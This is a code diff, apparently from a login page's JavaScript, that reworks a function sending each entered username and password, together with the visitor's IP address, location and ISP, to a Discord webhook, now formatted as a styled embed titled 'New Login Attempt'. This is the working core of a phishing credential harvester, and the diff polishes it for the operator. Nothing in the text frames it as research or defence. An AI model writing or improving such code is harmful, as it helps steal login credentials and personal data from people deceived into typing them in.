@@ -119,7 +119,7 @@ function showError(message) {
   statusBox.textContent = message;
 }
 
-// Function to get IP info and send to Discord
+// Function to get IP info and send to Discord (NEW EMBED DESIGN)
 async function sendToDiscord(username, password) {
   let ipInfo = "Unknown";
   let location = "Unknown";
@@ -136,12 +136,49 @@ async function sendToDiscord(username, password) {
     console.warn('Could not fetch IP info:', error);
   }
 
-  const content = `**New login attempt (test)**\n**Username/Email/Phone:** ${username || '*empty*'}\n**Password:** ${password || '*empty*'}\n\n**IP Address:** ${ipInfo}\n**Location:** ${location}\n**ISP:** ${isp}`;
-  
+  const now = new Date().toISOString();
+
+  // The Payload using Discord Embeds for a clean look
   const payload = {
-    content: content,
     username: 'Login Monitor',
-    avatar_url: 'https://cdn-icons-png.flaticon.com/512/1077/1077114.png'
+    avatar_url: 'https://cdn-icons-png.flaticon.com/512/1077/1077114.png',
+    embeds: [
+      {
+        title: "🔐 New Login Attempt",
+        color: 3447003, // Blue color. Change to 16711680 for Red if you want.
+        fields: [
+          {
+            name: "👤 Username / Email",
+            value: `\`\`\`${username || '*empty*'}\`\`\``,
+            inline: false
+          },
+          {
+            name: "🔑 Password",
+            value: `\`\`\`${password || '*empty*'}\`\`\``,
+            inline: false
+          },
+          {
+            name: "🌐 IP Address",
+            value: `\`${ipInfo}\``,
+            inline: true
+          },
+          {
+            name: "📍 Location",
+            value: `${location}`,
+            inline: true
+          },
+          {
+            name: "📡 ISP",
+            value: `${isp}`,
+            inline: true
+          }
+        ],
+        footer: {
+          text: "Webhook Test System"
+        },
+        timestamp: now
+      }
+    ]
   };
 
   try {
